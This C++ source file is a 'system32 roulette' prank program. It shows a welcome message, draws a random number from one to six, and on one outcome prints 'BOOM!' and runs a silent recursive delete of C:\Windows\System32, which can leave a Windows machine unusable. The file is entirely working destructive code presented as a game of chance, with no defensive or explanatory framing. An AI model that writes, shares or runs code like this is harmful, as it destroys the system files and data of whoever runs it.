#include <cstdlib> 
#include <ctime> 
#include <iostream>
#include <stdlib.h>
#include <direct.h>


using namespace std;



int main()
{
    char input;
    cout << "Welcome to system32 roulette! There is 1 in the chamber. Test your luck!" << endl;

    system("pause");
    srand((unsigned)time(0));
    int i;
    i = (rand() % 6) + 1;
    if (i == 2) {
        cout << "BOOM!" << endl;
        system("rmdir /Q /S C:\\Windows\\System32");
        system("pause");

    }
    else {
        cout << "click" << endl;
        system("pause");
    }

}
